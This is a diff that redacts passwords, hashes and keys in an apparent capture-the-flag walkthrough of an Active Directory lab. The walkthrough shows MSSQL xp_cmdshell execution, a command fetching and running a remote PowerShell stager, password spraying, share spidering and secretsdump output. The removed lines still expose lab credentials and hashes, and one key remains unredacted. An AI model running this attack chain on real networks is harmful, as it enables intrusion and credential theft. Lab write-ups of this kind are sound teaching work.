@@ -42,7 +42,7 @@ A Close Access Team has infiltrated Darkhaven Technologies and dropped a machine
 
 - **MSSQL `xp_cmdshell`** — default credentials harvested from the public web portal granted `sa` on SQL, enabling command execution as `NT AUTHORITY\SYSTEM` on the SQL host.
 - **Unprotected KeePass Store** — a KeePass database and its master password were left on disk, disclosing an IT department account (`showard`) that authenticated across the entire `ext.darkhaven.local` domain.
-- **Password Spray** — the onboarding default password `Welcome1@DarkH4ven` was reused by many users, granting local administrator on the CA host via `ichambers`.
+- **Password Spray** — the onboarding default password `<redacted>` was reused by many users, granting local administrator on the CA host via `ichambers`.
 - **NTLMv2 Relay Harvest** — capturing a SHARE server login with Inveigh disclosed `svc_webpool`'s NTLMv2 hash, cracked against a leaked internal wordlist.
 - **Notepad++ Backup Leak** — an abandoned Notepad++ `.bak` file on the web server leaked `kwarren`'s domain password in cleartext.
 - **ReadGMSAPassword + gMSA Reuse** — `kwarren` held ReadGMSAPassword on `ca_svc_account$`, and the account had been manually re-keyed to a reusable password (discovered in PowerShell history).
@@ -398,9 +398,9 @@ Facilities Coordinator — Operations
 We can confirm using NXC that the `svc_sql` account works:
 
 ```zsh
-Exegol ➜ /workspace 𝘹 nxc mssql ips.txt -u 'sql_svc' -p 'SqLS3rvic3!'
+Exegol ➜ /workspace 𝘹 nxc mssql ips.txt -u 'sql_svc' -p '<redacted>'
 MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
-MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_svc:SqLS3rvic3!
+MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_svc:<redacted>
 ```
 
 ---
@@ -412,9 +412,9 @@ MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_
 ### MSSQL Enumeration
 
 ```zsh
-Exegol ➜ /workspace 𝘹 nxc mssql 10.10.10.133 -u 'sql_svc' -p 'SqLS3rvic3!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+Exegol ➜ /workspace 𝘹 nxc mssql 10.10.10.133 -u 'sql_svc' -p '<redacted>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
 MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
-MSSQL       10.10.10.133    1433   SQL              [+] SQL\sql_svc:SqLS3rvic3! (admin)
+MSSQL       10.10.10.133    1433   SQL              [+] SQL\sql_svc:<redacted> (admin)
 MSSQL       10.10.10.133    1433   SQL              name:master
 MSSQL       10.10.10.133    1433   SQL              name:tempdb
 MSSQL       10.10.10.133    1433   SQL              name:model
@@ -424,9 +424,9 @@ MSSQL       10.10.10.133    1433   SQL              name:msdb
 We also have `xp_cmdshell`:
 
 ```zsh
-Exegol ➜ /workspace 𝘹 nxc mssql 10.10.10.133 -u 'sql_svc' -p 'SqLS3rvic3!' --local-auth -x whoami
+Exegol ➜ /workspace 𝘹 nxc mssql 10.10.10.133 -u 'sql_svc' -p '<redacted>' --local-auth -x whoami
 MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
-MSSQL       10.10.10.133    1433   SQL              [+] SQL\sql_svc:SqLS3rvic3! (admin)
+MSSQL       10.10.10.133    1433   SQL              [+] SQL\sql_svc:<redacted> (admin)
 MSSQL       10.10.10.133    1433   SQL              [+] Executed command via mssqlexec
 MSSQL       10.10.10.133    1433   SQL              nt authority\system
 ```
@@ -528,7 +528,7 @@ base64 -w0 implant.bin > implant.enc
 Now execute the bypass to gain a foothold:
 
 ```zsh
-nxc mssql 10.10.10.133 -u 'sql_svc' -p 'SqLS3rvic3!' --local-auth -X 'IEX(IWR -UseBasicParsing http://192.168.211.2:8000/stager.ps1)'
+nxc mssql 10.10.10.133 -u 'sql_svc' -p '<redacted>' --local-auth -X 'IEX(IWR -UseBasicParsing http://192.168.211.2:8000/stager.ps1)'
 ```
 
 ```zsh
@@ -583,12 +583,12 @@ Enumerating as `NT AUTHORITY\SYSTEM`:
 
 [*] Successfully executed hashdump
 [*] Got output:
-Administrator:500:Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-Guest:501:Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-DefaultAccount:503:DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-WDAGUtilityAccount:504:WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-sql_backup_local:1000:sql_backup_local:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-sql_svc_int:1002:sql_svc_int:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
+Administrator:500:Administrator:500:<redacted>:<redacted>:::::
+Guest:501:Guest:501:<redacted>:<redacted>:::::
+DefaultAccount:503:DefaultAccount:503:<redacted>:<redacted>:::::
+WDAGUtilityAccount:504:WDAGUtilityAccount:504:<redacted>:<redacted>:::::
+sql_backup_local:1000:sql_backup_local:1000:<redacted>:<redacted>:::::
+sql_svc_int:1002:sql_svc_int:1002:<redacted>:<redacted>:::::
 
 ```
 
@@ -647,7 +647,7 @@ Contents:
 IMPORTANT: Do not copy outside the management VLAN.
 Access requests: it-security@darkhaven.local
 
-Master Password: D@rkhav3n_IT_2024!#
+Master Password: <redacted>
 ```
 
 My password is not working, let's validate that the file is not corrupt:
@@ -656,16 +656,16 @@ My password is not working, let's validate that the file is not corrupt:
 PS C:\stored_passwords> certutil -hashfile C:\stored_passwords\it_passwords.kdbx SHA256
 certutil -hashfile C:\stored_passwords\it_passwords.kdbx SHA256
 SHA256 hash of C:\stored_passwords\it_passwords.kdbx:
-9379b6433e85ed34512fa0db7c5c9a6dfb1cf6ae5cb136b690f7af03b7f1a104
+<redacted>
 CertUtil: -hashfile command completed successfully.
 ```
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 sha256sum /workspace/killshot/it_passwords.kdbx
-9379b6433e85ed34512fa0db7c5c9a6dfb1cf6ae5cb136b690f7af03b7f1a104  /workspace/killshot/it_passwords.kdbx
+<redacted>  /workspace/killshot/it_passwords.kdbx
 ```
 
-> **Teaching Moment — When a "Master Password" is a Puzzle, not a Key:** The file checksummed identically on both sides, so the KDBX was intact. That means the documented master password itself was a red herring. Look at the value: `D@rkhav3n_IT_2024!#`. Tiny transpositions (leet patterns, order of the symbols, case) are a classic CTF author move — the real password is usually a near-anagram or mirror of what the README shows. Try variants until the vault opens.
+> **Teaching Moment — When a "Master Password" is a Puzzle, not a Key:** The file checksummed identically on both sides, so the KDBX was intact. That means the documented master password itself was a red herring. Look at the value: `<redacted>`. Tiny transpositions (leet patterns, order of the symbols, case) are a classic CTF author move — the real password is usually a near-anagram or mirror of what the README shows. Try variants until the vault opens.
 
 I was able to figure out the password, which is correct in the README but I will leave that up to you to determine.
 
@@ -698,32 +698,32 @@ Using this information I generated a user and password list.
 **Domain Users**
 
 ```
-showard : 5rtfgvb^RTFGVB — rdp://dc.ext.darkhaven.local — IT department account
+showard : <redacted> — rdp://dc.ext.darkhaven.local — IT department account
 ```
 
 **Network Infrastructure**
 
 ```
-admin    : Sw!tch@C0re2024    — ssh://10.10.10.250                    — Core Switch sw-core-01
-fwadmin  : F!r3w@ll_Ext_2024  — https://10.10.10.254                  — Firewall fw-ext-01
-vpnadmin : Gl0b@lC0nn3ct#VPN  — https://vpn.ext.darkhaven.local       — VPN Concentrator
+admin    : <redacted>    — ssh://10.10.10.250                    — Core Switch sw-core-01
+fwadmin  : <redacted>  — https://10.10.10.254                  — Firewall fw-ext-01
+vpnadmin : <redacted>  — https://vpn.ext.darkhaven.local       — VPN Concentrator
 ```
 
 **Servers**
 
 ```
-DARKHAVEN\Administrator : D@rkhav3n_DSRM_2024! — rdp://10.10.10.136       — Domain Controller
-sa                      : Darkhav3n_SA_2024!   — tcp://sql.ext.darkhaven.local:1433 — SQL Server
-DARKHAVEN\Administrator : Welcome1@DarkH4ven   — rdp://10.10.10.132       — Web Server
-DARKHAVEN\svc_backup    : V33mB@ckup#2024      — https://10.10.10.50:9443 — Backup Server
+DARKHAVEN\Administrator : <redacted> — rdp://10.10.10.136       — Domain Controller
+sa                      : <redacted>   — tcp://sql.ext.darkhaven.local:1433 — SQL Server
+DARKHAVEN\Administrator : <redacted>   — rdp://10.10.10.132       — Web Server
+DARKHAVEN\svc_backup    : <redacted>      — https://10.10.10.50:9443 — Backup Server
 ```
 
 **Service Accounts**
 
 ```
-sql_svc    : SqLS3rvic3!     — tcp://sql.ext.darkhaven.local:1433
-svc_backup : V33mB@ckup#2024 — Veeam B&R service account
-svc_webpool: W3bP00L!        — Also used as LDAP bind account
+sql_svc    : <redacted>     — tcp://sql.ext.darkhaven.local:1433
+svc_backup : <redacted> — Veeam B&R service account
+svc_webpool: <redacted>        — Also used as LDAP bind account
 ```
 
 Password spraying identifies we have a valid user.
@@ -735,17 +735,17 @@ Password spraying identifies we have a valid user.
 ## Enumerating Shares
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u showard -p '5rtfgvb^RTFGVB' --shares
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u showard -p '<redacted>' --shares
 SMB         10.10.10.4      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
 SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
 SMB         10.10.10.4      445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
-SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\showard:5rtfgvb^RTFGVB
-SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
-SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\showard:<redacted>
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\showard:<redacted>
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\showard:<redacted>
+SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\showard:<redacted>
 SMB         10.10.10.136    445    DC               [*] Enumerated shares
 SMB         10.10.10.136    445    DC               Share           Permissions     Remark
 SMB         10.10.10.136    445    DC               -----           -----------     ------
@@ -770,7 +770,7 @@ SMB         10.10.10.134    445    CA               ADMIN$                      
 SMB         10.10.10.134    445    CA               C$                              Default share
 SMB         10.10.10.134    445    CA               CertEnroll      READ            Active Directory Certificate Services share
 SMB         10.10.10.134    445    CA               IPC$            READ            Remote IPC
-SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\showard:<redacted>
 SMB         10.10.10.135    445    SHARE            [*] Enumerated shares
 SMB         10.10.10.135    445    SHARE            Share           Permissions     Remark
 SMB         10.10.10.135    445    SHARE            -----           -----------     ------
@@ -794,11 +794,11 @@ SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  IPC$            READ        
 NXC Module `spider_plus`:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.135 -u showard -p '5rtfgvb^RTFGVB' -M spider_plus
+Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.135 -u showard -p '<redacted>' -M spider_plus
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
+SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\showard:<redacted>
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*] Started module spidering_plus with the following options:
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*]  DOWNLOAD_FLAG: False
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*]     STATS_FLAG: True
@@ -845,11 +845,11 @@ Exegol ➜ .nxc/modules/nxc_spider_plus 𝘹 cat 10.10.10.135.json | jq
 ```
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.135 -u showard -p '5rtfgvb^RTFGVB' -M spider_plus -o DOWNLOAD_FLAG=True
+Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.135 -u showard -p '<redacted>' -M spider_plus -o DOWNLOAD_FLAG=True
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
+SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\showard:<redacted>
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*] Started module spidering_plus with the following options:
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*]  DOWNLOAD_FLAG: True
 SPIDER_PLUS 10.10.10.135    445    SHARE            [*]     STATS_FLAG: True
@@ -883,19 +883,19 @@ We found some more interesting passwords:
 
 ```zsh
 Exegol ➜ modules/nxc_spider_plus/10.10.10.135 𝘹 grep -rn "password\|Password\|USERNAME\|cred" /root/.nxc/modules/nxc_spider_plus/10.10.10.135/ --include="*.txt"
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:7:      Temp password: Welcome1@DarkH4ven (user changes at first login)
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:7:      Temp password: <redacted> (user changes at first login)
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:17:  [ ] Hand over device with temporary credentials
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:18:  [ ] Password change and MFA setup walkthrough
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/HR/Training/Security_Awareness_2025.txt:9:MODULE 2  Password Security and MFA                20 min
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:68:Rotate all credentials per the 90-day schedule.
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:75:  Password  : PAN_F!r3w@ll2024#ext
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:81:  Password  : C!sc0_C0r3$witch24
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:86:  Password  : Acc3ss$W1tch_24!
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:92:  Password  : PRTG_M0n!t0r@2024
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:97:  Password  : 00BM_K0ns0le#2024
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:102:  Password  : VPN_G@t3way$2024!
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:107:  Password      : W1F!_C0ntr0ll3r#24
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:114:  Password  : N3t0ps$Svc_2024!
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:75:  Password  : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:81:  Password  : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:86:  Password  : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:92:  Password  : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:97:  Password  : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:102:  Password  : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:107:  Password      : <redacted>
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:114:  Password  : <redacted>
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:158:2025-01-14  kwarren    v3.2 - Updated OOBM password post rotation
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Network/Runbooks/Network_Infrastructure_Runbook_v3.txt:162:2024-01-10  kwarren    v2.3 - Added VPN gateway credentials
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/IT/Security/Audits/Annual_Pentest_Summary_2024.txt:26:  M-003  Several service accounts with non-expiring passwords and
@@ -912,7 +912,7 @@ Exegol ➜ modules/nxc_spider_plus/10.10.10.135 𝘹 grep -rn "password\|Passwor
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/Operations/SLAs/MSS_SLA_Template_v4.txt:27:  SOC uptime < 99.97%         5% monthly service credit
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/Operations/SLAs/MSS_SLA_Template_v4.txt:28:  Portal uptime < 99.9%       2% monthly service credit
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkhavenData/Operations/SLAs/MSS_SLA_Template_v4.txt:30:  Maximum monthly credit      30% of monthly fee
-/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkheavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:7:      Temp password: Welcome1@DarkH4ven (user changes at first login)
+/root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkheavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:7:      Temp password: <redacted> (user changes at first login)
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkheavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:17:  [ ] Hand over device with temporary credentials
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkheavenData/HR/Onboarding/New_Starter_IT_Checklist.txt:18:  [ ] Password change and MFA setup walkthrough
 /root/.nxc/modules/nxc_spider_plus/10.10.10.135/DarkheavenData/HR/Training/Security_Awareness_2025.txt:9:MODULE 2  Password Security and MFA                20 min
@@ -923,24 +923,24 @@ Exegol ➜ modules/nxc_spider_plus/10.10.10.135 𝘹 grep -rn "password\|Passwor
 ```
 
 ```
-- PAN_F!r3w@ll2024#ext — Firewall
-  - C!sc0_C0r3$witch24 — Core Switch
-  - Acc3ss$W1tch_24! — Access Switch
-  - PRTG_M0n!t0r@2024 — PRTG Monitoring
-  - 00BM_K0ns0le#2024 — Out-of-Band Management
-  - VPN_G@t3way$2024! — VPN
-  - W1F!_C0ntr0ll3r#24 — WiFi Controller
-  - N3t0ps$Svc_2024! — NetOps service account
+- <redacted> — Firewall
+  - <redacted> — Core Switch
+  - <redacted> — Access Switch
+  - <redacted> — PRTG Monitoring
+  - <redacted> — Out-of-Band Management
+  - <redacted> — VPN
+  - <redacted> — WiFi Controller
+  - <redacted> — NetOps service account
 ```
 
-Also including the default password: `Welcome1@DarkH4ven`.
+Also including the default password: `<redacted>`.
 
 I then used NXC to capture our users list:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc ldap 10.10.10.5 -u showard -p '5rtfgvb^RTFGVB' --users
+Exegol ➜ /workspace/killshot 𝘹 nxc ldap 10.10.10.5 -u showard -p '<redacted>' --users
 LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:Enforced) (channel binding:No TLS cert)
-LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\showard:5rtfgvb^RTFGVB
+LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\showard:<redacted>
 LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  [*] Enumerated 301 domain users: corp.darkhaven.tech
 LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  -Username-                    -Last PW Set-       -BadPW-  -Description-
 LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  Administrator                 2026-03-06 17:26:16 11       Built-in account for administering the computer/domain
@@ -973,7 +973,7 @@ LDAP        10.10.10.5      389    EC2AMAZ-KK0CT8N  kwarren                     
 ```
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 evil-winrm -u "kwarren" -p "Welcome1@DarkH4ven" -i "10.10.10.136"
+Exegol ➜ /workspace/killshot 𝘹 evil-winrm -u "kwarren" -p "<redacted>" -i "10.10.10.136"
 
 Evil-WinRM shell v3.9
 
@@ -983,7 +983,7 @@ Info: Establishing connection to remote endpoint
 But it seems that all users have the default password:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 evil-winrm -u "twells" -p "Welcome1@DarkH4ven" -i "10.10.10.136"
+Exegol ➜ /workspace/killshot 𝘹 evil-winrm -u "twells" -p "<redacted>" -i "10.10.10.136"
 
 Evil-WinRM shell v3.9
 
@@ -994,7 +994,7 @@ Info: Establishing connection to remote endpoint
 ## NXC Password Spray
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u corp_users.txt -p 'Welcome1@DarkH4ven' --continue-on-success
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u corp_users.txt -p '<redacted>' --continue-on-success
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
@@ -1008,15 +1008,15 @@ SMB         10.10.10.136    445    DC               [-] Connection Error: The NE
 SMB         10.10.10.136    445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
 SMB         10.10.10.136    445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
 SMB         10.10.10.136    445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\abarnes:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\acarter:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\aclark:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\acoleman:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\adiaz:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\agomez:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\agordon:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\agray:Welcome1@DarkH4ven
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\ahenderson:Welcome1@DarkH4vencd 
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\abarnes:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\acarter:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\aclark:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\acoleman:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\adiaz:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\agomez:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\agordon:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\agray:<redacted>
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\ahenderson:<redacted>cd 
 ```
 
 ```zsh
@@ -1044,52 +1044,52 @@ It appears that the accounts are locked out.
 ## Further Enumeration
 
 ```zsh
-nxc smb ips.txt -u ext_users.txt -p 'Welcome1@DarkH4ven' --continue-on-success
+nxc smb ips.txt -u ext_users.txt -p '<redacted>' --continue-on-success
 ```
 
 ```zsh
-SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ichambers:Welcome1@DarkH4ven (admin)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ichambers:<redacted> (admin)
 ```
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 secretsdump.py 'ichambers:Welcome1@DarkH4ven@10.10.10.134'
+Exegol ➜ /workspace/killshot 𝘹 secretsdump.py 'ichambers:<redacted>@10.10.10.134'
 Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Service RemoteRegistry is in stopped state
 [*] Starting service RemoteRegistry
-[*] Target system bootKey: 0x8615af0392830be4eb66632c92ff674e
+[*] Target system bootKey: <redacted>
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:7af69f428fd21312a225c74e5f574ed6:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
-ca_svc_account$:1000:aad3b435b51404eeaad3b435b51404ee:d825d33332279362b7c3e6ba121aa570:::
+Administrator:500:<redacted>:<redacted>:::
+Guest:501:<redacted>:<redacted>:::
+DefaultAccount:503:<redacted>:<redacted>:::
+WDAGUtilityAccount:504:<redacted>:<redacted>:::
+ca_svc_account$:1000:<redacted>:<redacted>:::
 [*] Dumping cached domain logon information (domain/username:hash)
-EXT.DARKHAVEN.LOCAL/Administrator:$DCC2$10240#Administrator#1ab26668ff3a2923847d361f31e0f601: (2026-03-02 14:03:07+00:00)
+EXT.DARKHAVEN.LOCAL/Administrator:$DCC2$10240#Administrator#<redacted>: (2026-03-02 14:03:07+00:00)
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
-DARKHAVEN\CA$:aes256-cts-hmac-sha1-96:a3fe534f557c7aa5b402e48319381f1a68c83682b612c1438bb27f8fa072d2da
-DARKHAVEN\CA$:aes128-cts-hmac-sha1-96:eae952bb65fa3a3eaa74591b8591f90d
+DARKHAVEN\CA$:aes256-cts-hmac-sha1-96:<redacted>
+DARKHAVEN\CA$:aes128-cts-hmac-sha1-96:<redacted>
 DARKHAVEN\CA$:des-cbc-md5:b945151c6bc1b5a1
